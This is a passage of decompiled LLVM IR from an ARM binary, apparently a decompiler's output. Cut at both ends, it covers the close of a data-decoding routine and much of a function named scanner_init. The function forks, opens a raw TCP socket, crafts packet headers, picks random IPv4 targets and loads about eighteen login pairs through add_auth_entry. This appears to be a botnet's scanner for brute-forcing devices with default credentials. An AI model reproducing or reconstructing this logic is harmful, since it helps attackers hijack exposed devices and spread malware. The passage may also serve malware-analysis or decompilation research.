  %v2_e16c = add i32 %v1_e16c, %v2_e174
  %v3_e16c = inttoptr i32 %v2_e16c to i8*
  %v4_e16c = load i8, i8* %v3_e16c, align 1
  %v6_e16c = zext i8 %v4_e16c to i32
  %v1_e170 = xor i32 %v6_e16c, 84
  store i32 %v1_e170, i32* %r3.global-to-local, align 4
  %v1_e174 = trunc i32 %v1_e170 to i8
  store i8 %v1_e174, i8* %v3_e16c, align 1
  %v0_e178 = load i32, i32* %r2.global-to-local, align 4
  %v1_e178 = add i32 %v0_e178, 1
  store i32 %v1_e178, i32* %r2.global-to-local, align 4
  %v1_e17c = load i32, i32* @r6, align 4
  %v9_e17c = icmp eq i32 %v1_e178, %v1_e17c
  br i1 %v9_e17c, label %dec_label_pc_e184.loopexit, label %dec_label_pc_e16c

dec_label_pc_e184.loopexit:                       ; preds = %dec_label_pc_e16c
  %extract.t7 = trunc i32 %v1_e178 to i8
  br label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %dec_label_pc_e184.loopexit, %dec_label_pc_e118
  %v0_e194.off0 = phi i8 [ %extract.t7, %dec_label_pc_e184.loopexit ], [ %extract.t8, %dec_label_pc_e118 ]
  %v2_e184 = load i32, i32* @global_var_216f4.135, align 4
  store i32 %v2_e184, i32* %r0.global-to-local, align 4
  %v2_e188 = load i32, i32* @global_var_21720.137, align 4
  %v3_e18c = mul i32 %v2_e184, 16
  store i32 %v3_e18c, i32* %r1.global-to-local, align 4
  %v2_e190 = or i32 %v3_e18c, 13
  %v3_e194 = add i32 %v2_e190, %v2_e188
  %v4_e194 = inttoptr i32 %v3_e194 to i8*
  store i8 %v0_e194.off0, i8* %v4_e194, align 1
  store i32 ptrtoint (i16** @global_var_21724.139 to i32), i32* %r4.global-to-local, align 4
  %v2_e1a0 = load i16, i16* bitcast (i16** @global_var_21724.139 to i16*), align 4
  %v3_e1a0 = zext i16 %v2_e1a0 to i32
  store i32 %v3_e1a0, i32* %lr.global-to-local, align 4
  %v2_e1a8 = load i32, i32* @global_var_21720.137, align 4
  store i32 %v2_e1a8, i32* %r2.global-to-local, align 4
  %v0_e1b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e1b0 = add i32 %v0_e1b0, %v2_e1a8
  store i32 %v2_e1b0, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21724.139 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e1b8 = load i32, i32* @sb, align 4
  %v1_e1b8 = load i32, i32* @r7, align 4
  %v2_e1b8 = add i32 %v1_e1b8, %v0_e1b8
  store i32 %v2_e1b8, i32* %ip.global-to-local, align 4
  %v0_e1bc = load i32, i32* %r0.global-to-local, align 4
  %v1_e1bc = add i32 %v0_e1bc, 1
  store i32 %v1_e1bc, i32* %r0.global-to-local, align 4
  %v3_e1c0 = add i32 %v2_e1b0, 10
  %v4_e1c0 = inttoptr i32 %v3_e1c0 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21724.139 to i32), i32 16), i32 16) to i16), i16* %v4_e1c0, align 2
  %v0_e1c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_e1c4 = trunc i32 %v0_e1c4 to i16
  %v2_e1c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1c4 = add i32 %v2_e1c4, 8
  %v4_e1c4 = inttoptr i32 %v3_e1c4 to i16*
  store i16 %v1_e1c4, i16* %v4_e1c4, align 2
  %v0_e1c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_e1c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_e1c8 = add i32 %v1_e1c8, 4
  %v3_e1c8 = inttoptr i32 %v2_e1c8 to i32*
  store i32 %v0_e1c8, i32* %v3_e1c8, align 4
  %v1_e1cc = load i32, i32* @fp, align 4
  %v2_e1cc = inttoptr i32 %v1_e1cc to i32*
  store i32 %v1_e1bc, i32* %v2_e1cc, align 4
  %v0_e1d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1d0 = trunc i32 %v0_e1d0 to i16
  %v2_e1d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_e1d0 = inttoptr i32 %v2_e1d0 to i16*
  store i16 %v1_e1d0, i16* %v3_e1d0, align 2
  store i32 %v3_e08c, i32* @r4, align 4
  store i32 %v6_e08c, i32* @r5, align 4
  store i32 %v9_e08c, i32* @r6, align 4
  store i32 %v12_e08c, i32* @r7, align 4
  store i32 %v15_e08c, i32* @r8, align 4
  store i32 %v18_e08c, i32* @sb, align 4
  store i32 %v21_e08c, i32* @sl, align 4
  store i32 %v24_e08c, i32* @fp, align 4
  ret i32 %v1_e1bc

; uselistorder directives
  uselistorder i32 %v3_e18c, { 1, 0 }
  uselistorder i32 %v1_e178, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e14c, { 1, 0, 2 }
  uselistorder i32 %v3_e120, { 1, 0 }
  uselistorder i32 %v1_e10c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e0e0, { 1, 0, 2 }
  uselistorder i32 %v2_e0bc, { 1, 0, 2 }
  uselistorder i32 %v3_e0b0, { 1, 0 }
  uselistorder i32 %v1_e0a0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e1ec = load i32, i32* @r5, align 4
  %v18_e1ec = load i32, i32* @sb, align 4
  %v0_e1f8 = call i32 @__libc_fork()
  store i32 %v0_e1f8, i32* %r0.global-to-local, align 4
  %v7_e1fc = icmp eq i32 %v0_e1f8, -1
  %. = zext i1 %v7_e1fc to i32
  %tmp369 = icmp slt i32 %v0_e1f8, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24214.141 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e218 = icmp eq i32 %storemerge329, 0
  store i1 %v2_e218, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e1f8, i32* @global_var_24214.141, align 4
  br i1 %v2_e218, label %dec_label_pc_e234, label %dec_label_pc_e224

dec_label_pc_e224:                                ; preds = %entry
  store i32 %v6_e1ec, i32* @r5, align 4
  store i32 %v18_e1ec, i32* @sb, align 4
  ret i32 %v0_e1f8

dec_label_pc_e234:                                ; preds = %entry
  %v0_e234 = call i32 @util_local_addr()
  store i32 %v0_e234, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e234, i32* @global_var_241f0.57, align 4
  %v1_e240 = call i32 @rand_init(i32 %v0_e234)
  %v0_e244 = load i32, i32* @r4, align 4
  store i32 %v0_e244, i32* %r0.global-to-local, align 4
  %v1_e248 = inttoptr i32 %v0_e244 to i32*
  %v2_e248 = call i32 @__GI_time(i32* %v1_e248)
  store i32 ptrtoint (i32* @global_var_21728.133 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e248, i32* @global_var_21728.133, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e25c = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_2420c.145 to i32), i32* %r3.global-to-local, align 4
  %v0_e264 = load i32, i32* @r4, align 4
  store i32 %v0_e264, i32* %stack_var_-52, align 4
  store i32 %v2_e25c, i32* @global_var_2420c.145, align 4
  store i32 %v0_e264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e270

dec_label_pc_e270:                                ; preds = %dec_label_pc_e270.dec_label_pc_e270_crit_edge, %dec_label_pc_e234
  %v2_e27c = phi i32 [ %v2_e27c.pre, %dec_label_pc_e270.dec_label_pc_e270_crit_edge ], [ %v2_e25c, %dec_label_pc_e234 ]
  %v0_e284 = phi i32 [ %v0_e2b4, %dec_label_pc_e270.dec_label_pc_e270_crit_edge ], [ %v0_e264, %dec_label_pc_e234 ]
  %v3_e278 = mul i32 %v0_e284, 256
  store i32 %v3_e278, i32* %ip.global-to-local, align 4
  store i32 %v2_e27c, i32* @lr, align 4
  %v2_e28c = mul i32 %v0_e284, 288
  %v1_e294 = add i32 %v0_e284, 1
  store i32 %v1_e294, i32* %r0.global-to-local, align 4
  %v2_e298 = add i32 %v2_e28c, %v2_e27c
  store i32 %v2_e298, i32* %r2.global-to-local, align 4
  store i32 %v2_e298, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e2ac = add i32 %v2_e298, 4
  %v3_e2ac = inttoptr i32 %v2_e2ac to i32*
  store i32 -1, i32* %v3_e2ac, align 4
  %v0_e2b0 = load i32, i32* @r5, align 4
  %v1_e2b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e2b0 = add i32 %v1_e2b0, 12
  %v3_e2b0 = inttoptr i32 %v2_e2b0 to i32*
  store i32 %v0_e2b0, i32* %v3_e2b0, align 4
  %v0_e2b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e2b4, i32* %stack_var_-52, align 4
  %v7_e2b8 = icmp sgt i32 %v1_e294, 255
  br i1 %v7_e2b8, label %dec_label_pc_e2bc, label %dec_label_pc_e270.dec_label_pc_e270_crit_edge

dec_label_pc_e270.dec_label_pc_e270_crit_edge:    ; preds = %dec_label_pc_e270
  %v2_e27c.pre = load i32, i32* @global_var_2420c.145, align 4
  br label %dec_label_pc_e270

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e270
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e2c8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e2c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24210.147 to i32), i32* %r2.global-to-local, align 4
  %v2_e2d0 = icmp eq i32 %v3_e2c8, -1
  store i1 %v2_e2d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e2d0 = icmp eq i32 %v3_e2c8, -1
  store i1 %v7_e2d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e2c8, i32* @r4, align 4
  store i32 %v3_e2c8, i32* @global_var_24210.147, align 4
  br i1 %v7_e2d0, label %dec_label_pc_e2bc.dec_label_pc_f890_crit_edge, label %dec_label_pc_e2e0

dec_label_pc_e2bc.dec_label_pc_f890_crit_edge:    ; preds = %dec_label_pc_e2bc
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_f890

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e2bc
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e2e4 = load i32, i32* @r5, align 4
  store i32 %v0_e2e4, i32* @r2, align 4
  %v2_e2e8 = call i32 @__libc_fcntl(i32 %v3_e2c8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e2f0 = or i32 %v2_e2e8, 2048
  store i32 %v1_e2f0, i32* @r2, align 4
  %v0_e2f4 = load i32, i32* @r4, align 4
  store i32 %v0_e2f4, i32* %r0.global-to-local, align 4
  %v2_e2f8 = call i32 @__libc_fcntl(i32 %v0_e2f4, i32 4)
  %v2_e300 = load i32, i32* @global_var_24210.147, align 4
  store i32 %v2_e300, i32* %r0.global-to-local, align 4
  %v2_e304 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e30c = load i32, i32* @r5, align 4
  store i32 %v0_e30c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e314 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e314, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e324 = call i32 @__GI_setsockopt(i32 %v2_e300, i32 %v0_e30c, i32 3, i32 %v2_e314, i32 4)
  store i32 %v5_e324, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e328 = icmp eq i32 %v5_e324, 0
  store i1 %v2_e328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e328, label %dec_label_pc_e330, label %dec_label_pc_f884

dec_label_pc_e330:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_e330
  %v0_e330 = call i32 @rand_next()
  %v3_e334 = mul i32 %v0_e330, 65536
  store i32 %v3_e334, i32* %r0.global-to-local, align 4
  %v1_e33c = mul i32 %v0_e330, 256
  %v3_e340 = and i32 %v1_e33c, 65280
  %tmp372 = udiv i32 %v0_e330, 256
  %v4_e344 = urem i32 %tmp372, 256
  %v5_e344 = or i32 %v4_e344, %v3_e340
  store i32 %v5_e344, i32* %r3.global-to-local, align 4
  %v2_e348 = icmp ugt i32 %v5_e344, 1023
  store i1 %v2_e348, i1* %cpsr_c.global-to-local, align 1
  %v7_e348 = icmp eq i32 %v5_e344, 1024
  store i1 %v7_e348, i1* %cpsr_z.global-to-local, align 1
  %v3_e350 = icmp ult i32 %v5_e344, 1022
  br i1 %v3_e350, label %dec_label_pc_e330, label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %dec_label_pc_e330
  %v5_e34c.le = trunc i32 %v0_e330 to i16
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %r0.global-to-local, align 4
  %v2_e358 = load i8, i8* bitcast (i8** @global_var_216f8.149 to i8*), align 4
  %v3_e358 = zext i8 %v2_e358 to i32
  %v1_e35c = and i32 %v3_e358, 240
  %v1_e360 = or i32 %v1_e35c, 5
  store i32 %v1_e360, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_216f8.149 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_216fa.150 to i16*), align 4
  %v0_e380 = call i32 @rand_next()
  %v1_e380 = trunc i32 %v0_e380 to i16
  %v3_e388 = load i8, i8* @global_var_21718.153, align 1
  store i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %ip.global-to-local, align 4
  %v1_e398 = urem i8 %v3_e388, 16
  store i16 %v1_e380, i16* bitcast (i32* @global_var_216fc.154 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e3a8 = or i8 %v1_e398, 80
  store i8 64, i8* bitcast (i32* @global_var_21700.155 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_21701.156 to i8*), align 4
  store i8 %v1_e3a8, i8* @global_var_21718.153, align 1
  %v4_e3b8 = sext i16 %v5_e34c.le to i32
  store i32 %v4_e3b8, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_2170e.157, align 2
  store i16 %v5_e34c.le, i16* @global_var_2170c.152, align 2
  %v0_e3c8 = call i32 @rand_next()
  %v1_e3c8 = trunc i32 %v0_e3c8 to i16
  %v3_e3d0 = load i8, i8* @global_var_21719.158, align 1
  %v4_e3d0 = zext i8 %v3_e3d0 to i32
  store i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32* %ip.global-to-local, align 4
  %v1_e3d8 = or i32 %v4_e3d0, 2
  store i32 %v1_e3d8, i32* %r3.global-to-local, align 4
  store i16 %v1_e3c8, i16* bitcast (i32* @global_var_2171a.159 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_18d8c.161 to i32), i32* %r1.global-to-local, align 4
  %v1_e3e4 = trunc i32 %v1_e3d8 to i8
  store i8 %v1_e3e4, i8* @global_var_21719.158, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e3f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint (i32* @global_var_18d8c.161 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18d90.165 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e400 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([5 x i8]* @global_var_18d90.165 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18d98.167 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e410 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([9 x i8]* @global_var_18d98.167 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_18da4.169 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18da4.169 to i32), i32* %r1.global-to-local, align 4
  %v5_e420 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18da4.169 to i32), i32 ptrtoint ([7 x i8]* @global_var_18da4.169 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18d8c.161 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e430 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32 ptrtoint (i32* @global_var_18d8c.161 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18db4.173 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e440 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([9 x i8]* @global_var_18db4.173 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_18dc0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18dc0.175 to i32), i32* %r1.global-to-local, align 4
  %v5_e450 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18dc0.175 to i32), i32 ptrtoint ([6 x i8]* @global_var_18dc0.175 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18dc8.177 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e460 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([6 x i8]* @global_var_18dc8.177 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_18dd0.179 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18dd0.179 to i32), i32* %r1.global-to-local, align 4
  %v5_e470 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18dd0.179 to i32), i32 ptrtoint ([8 x i8]* @global_var_18dd0.179 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e480 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18dd8.181 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e490 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint (i32* @global_var_18dd8.181 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18de8.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e4a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), i32 ptrtoint ([6 x i8]* @global_var_18de8.183 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32* %r1.global-to-local, align 4
  %v5_e4b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18de8.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e4c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), i32 ptrtoint ([6 x i8]* @global_var_18de8.183 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18df8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e4d0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32 ptrtoint (i32* @global_var_18df8.187 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18e04.189 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e4e0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), i32 ptrtoint (i32* @global_var_18e04.189 to i32), i32 15)
  store i32 %v4_e4e0, i32* %r0.global-to-local, align 4
  %v2_e4e8 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e4e8, i32* @lr, align 4
  %v1_e814 = add i32 %v2_e4e8, 20
  %v1_e868 = add i32 %v2_e4e8, 16
  %v2_e868 = inttoptr i32 %v1_e868 to i32*
  %v1_e87c = add i32 %v2_e4e8, 9
  %v2_e87c = inttoptr i32 %v1_e87c to i8*
  %v1_e910 = add i32 %v2_e4e8, 12
  %v2_e910 = inttoptr i32 %v1_e910 to i32*
  %v2_eaf4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_eb3c = ptrtoint i32* %stack_var_-68 to i32
  %v2_eb40 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eb44 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f518 = ptrtoint i32* %stack_var_-45 to i32
  %v2_f52c = ptrtoint i32* %stack_var_-77 to i32
  %v2_f484 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f640 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e510 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e4f0

dec_label_pc_e4f0:                                ; preds = %dec_label_pc_ecd8, %dec_label_pc_e354
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e354 ], [ %stack_var_-1876.1, %dec_label_pc_ecd8 ]
  store i32 ptrtoint (i32* @global_var_21728.133 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e4f8 = load i32, i32* @global_var_21728.133, align 4
  store i32 %v2_e4f8, i32* @r4, align 4
  %v3_e4fc = icmp uge i32 %stack_var_-1876.0, %v2_e4f8
  store i1 %v3_e4fc, i1* %cpsr_c.global-to-local, align 1
  %v9_e4fc = icmp eq i32 %stack_var_-1876.0, %v2_e4f8
  store i1 %v9_e4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e4fc, label %dec_label_pc_e804, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_e510, i32* @r5, align 4
  br label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %bb405, %dec_label_pc_e504
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e528 = call i32 @rand_next()
  %v1_e528 = trunc i32 %v0_e528 to i16
  store i32 %v0_e528, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %ip.global-to-local, align 4
  %v2_e534 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_e534, i32* %r3.global-to-local, align 4
  store i16 %v1_e528, i16* bitcast (i32* @global_var_216fc.154 to i16*), align 4
  store i32 %v2_e534, i32* @global_var_21704.190, align 4
  br label %dec_label_pc_e540

dec_label_pc_e540:                                ; preds = %dec_label_pc_e698, %dec_label_pc_e570, %dec_label_pc_e6cc, %dec_label_pc_e6c0, %dec_label_pc_e6b4, %dec_label_pc_e6a8, %.thread48, %.thread32, %.thread28, %.thread24, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e60c, %dec_label_pc_e604, %bb383, %dec_label_pc_e5d4, %dec_label_pc_e5b0, %bb376, %dec_label_pc_e580, %bb375, %dec_label_pc_e568, %bb374, %bb400, %dec_label_pc_e514
  %v0_e540 = call i32 @rand_next()
  store i32 %v0_e540, i32* %r0.global-to-local, align 4
  %v1_e544 = urem i32 %v0_e540, 256
  store i32 %v1_e544, i32* %r1.global-to-local, align 4
  %v3_e548 = udiv i32 %v0_e540, 256
  store i32 %v3_e548, i32* %r3.global-to-local, align 4
  %v3_e54c = udiv i32 %v0_e540, 65536
  store i32 %v3_e54c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e550 = icmp eq i32 %v1_e544, 0
  store i1 %v2_e550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e550, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e540
  %v3_e554 = icmp ugt i32 %v1_e544, 126
  store i1 %v3_e554, i1* %cpsr_c.global-to-local, align 1
  %v8_e554 = icmp eq i32 %v1_e544, 127
  store i1 %v8_e554, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e540, %bb373
  %v0_e564 = phi i1 [ true, %dec_label_pc_e540 ], [ %v8_e554, %bb373 ]
  %v1_e558 = urem i32 %v3_e548, 256
  store i32 %v1_e558, i32* %ip.global-to-local, align 4
  %v1_e55c = urem i32 %v3_e54c, 256
  store i32 %v1_e55c, i32* %r2.global-to-local, align 4
  %v1_e560 = and i32 %v0_e540, 8388608
  %v2_e560 = icmp ne i32 %v1_e560, 0
  store i1 %v2_e560, i1* %cpsr_c.global-to-local, align 1
  %v3_e560 = udiv i32 %v0_e540, 16777216
  store i32 %v3_e560, i32* %r0.global-to-local, align 4
  br i1 %v0_e564, label %dec_label_pc_e540, label %dec_label_pc_e568

dec_label_pc_e568:                                ; preds = %bb374
  %v2_e568 = icmp ugt i32 %v1_e544, 2
  store i1 %v2_e568, i1* %cpsr_c.global-to-local, align 1
  %v7_e568 = icmp eq i32 %v1_e544, 3
